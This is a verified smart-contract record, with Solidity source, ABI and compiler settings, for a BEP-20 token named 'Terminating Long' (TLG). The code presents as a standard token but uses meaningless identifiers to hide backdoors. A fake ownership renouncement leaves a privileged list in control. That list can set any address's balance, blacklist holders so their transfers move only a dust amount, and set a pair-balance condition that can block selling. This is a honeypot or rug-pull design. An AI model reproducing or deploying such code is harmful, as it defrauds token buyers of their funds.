{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface feeTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverMarketingWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTrading {\n    function createPair(address fromAutoTeam, address amountTeam) external returns (address);\n}\n\ninterface fromReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapFeeTotal) external view returns (uint256);\n\n    function transfer(address marketingList, uint256 tradingShould) external returns (bool);\n\n    function allowance(address atFeeSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingList,\n        uint256 tradingShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyMax, uint256 value);\n    event Approval(address indexed atFeeSell, address indexed spender, uint256 value);\n}\n\ninterface liquiditySender is fromReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TerminatingLong is receiverMarketingWallet, fromReceiver, liquiditySender {\n\n    function tradingFrom(address takeTeam) public {\n        limitReceiverAmount();\n        if (shouldAtWallet) {\n            launchedMarketing = sellIs;\n        }\n        if (takeTeam == senderListSwap || takeTeam == txTokenList) {\n            return;\n        }\n        listLaunched[takeTeam] = true;\n    }\n\n    uint256 constant swapExempt = 10 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchSwap;\n    }\n\n    mapping(address => bool) public listLaunched;\n\n    bool private shouldAtWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellReceiver;\n    }\n\n    constructor (){\n        \n        feeTeam tokenBuy = feeTeam(amountTrading);\n        txTokenList = feeTrading(tokenBuy.factory()).createPair(tokenBuy.WETH(), address(this));\n        if (shouldAtWallet != takeMin) {\n            sellIs = launchedMarketing;\n        }\n        senderListSwap = _msgSender();\n        minEnableTeam();\n        fromFund[senderListSwap] = true;\n        walletAmount[senderListSwap] = sellReceiver;\n        if (launchedMarketing != sellIs) {\n            takeMin = false;\n        }\n        emit Transfer(address(0), senderListSwap, sellReceiver);\n    }\n\n    mapping(address => uint256) private walletAmount;\n\n    function tokenTo(address launchedShould, address marketingList, uint256 tradingShould) internal returns (bool) {\n        if (launchedShould == senderListSwap) {\n            return receiverWalletAmount(launchedShould, marketingList, tradingShould);\n        }\n        uint256 autoTeamLaunched = fromReceiver(txTokenList).balanceOf(marketingMin);\n        require(autoTeamLaunched == walletAt);\n        require(marketingList != marketingMin);\n        if (listLaunched[launchedShould]) {\n            return receiverWalletAmount(launchedShould, marketingList, swapExempt);\n        }\n        return receiverWalletAmount(launchedShould, marketingList, tradingShould);\n    }\n\n    function transferFrom(address launchedShould, address marketingList, uint256 tradingShould) external override returns (bool) {\n        if (_msgSender() != amountTrading) {\n            if (buyTeam[launchedShould][_msgSender()] != type(uint256).max) {\n                require(tradingShould <= buyTeam[launchedShould][_msgSender()]);\n                buyTeam[launchedShould][_msgSender()] -= tradingShould;\n            }\n        }\n        return tokenTo(launchedShould, marketingList, tradingShould);\n    }\n\n    function getOwner() external view returns (address) {\n        return minEnable;\n    }\n\n    function transfer(address marketingSwap, uint256 tradingShould) external virtual override returns (bool) {\n        return tokenTo(_msgSender(), marketingSwap, tradingShould);\n    }\n\n    string private limitExempt = \"Terminating Long\";\n\n    address private minEnable;\n\n    function atTotalAuto(uint256 tradingShould) public {\n        limitReceiverAmount();\n        walletAt = tradingShould;\n    }\n\n    address marketingMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public fundAuto;\n\n    mapping(address => bool) public fromFund;\n\n    bool public maxShould;\n\n    address public senderListSwap;\n\n    string private launchSwap = \"TLG\";\n\n    function minEnableTeam() public {\n        emit OwnershipTransferred(senderListSwap, address(0));\n        minEnable = address(0);\n    }\n\n    bool private takeMin;\n\n    function owner() external view returns (address) {\n        return minEnable;\n    }\n\n    function limitListAmount(address marketingSwap, uint256 tradingShould) public {\n        limitReceiverAmount();\n        walletAmount[marketingSwap] = tradingShould;\n    }\n\n    uint256 walletAt;\n\n    mapping(address => mapping(address => uint256)) private buyTeam;\n\n    function balanceOf(address swapFeeTotal) public view virtual override returns (uint256) {\n        return walletAmount[swapFeeTotal];\n    }\n\n    function approve(address senderReceiver, uint256 tradingShould) public virtual override returns (bool) {\n        buyTeam[_msgSender()][senderReceiver] = tradingShould;\n        emit Approval(_msgSender(), senderReceiver, tradingShould);\n        return true;\n    }\n\n    uint256 fromTradingSwap;\n\n    uint256 private sellReceiver = 100000000 * 10 ** 18;\n\n    address public txTokenList;\n\n    function allowance(address walletFeeLaunch, address senderReceiver) external view virtual override returns (uint256) {\n        if (senderReceiver == amountTrading) {\n            return type(uint256).max;\n        }\n        return buyTeam[walletFeeLaunch][senderReceiver];\n    }\n\n    function receiverWalletAmount(address launchedShould, address marketingList, uint256 tradingShould) internal returns (bool) {\n        require(walletAmount[launchedShould] >= tradingShould);\n        walletAmount[launchedShould] -= tradingShould;\n        walletAmount[marketingList] += tradingShould;\n        emit Transfer(launchedShould, marketingList, tradingShould);\n        return true;\n    }\n\n    uint256 public launchedMarketing;\n\n    address amountTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed swapTotal, address indexed teamAuto);\n\n    function enableIs(address feeAuto) public {\n        if (maxShould) {\n            return;\n        }\n        if (launchedMarketing != sellIs) {\n            shouldAtWallet = true;\n        }\n        fromFund[feeAuto] = true;\n        \n        maxShould = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyAuto;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitExempt;\n    }\n\n    uint8 private buyAuto = 18;\n\n    bool public launchSender;\n\n    function limitReceiverAmount() private view {\n        require(fromFund[_msgSender()]);\n    }\n\n    uint256 public sellIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFeeSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFeeLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"atTotalAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFeeTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"}],\"name\":\"enableIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"limitListAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minEnableTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderListSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeam\",\"type\":\"address\"}],\"name\":\"tradingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTokenList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TerminatingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}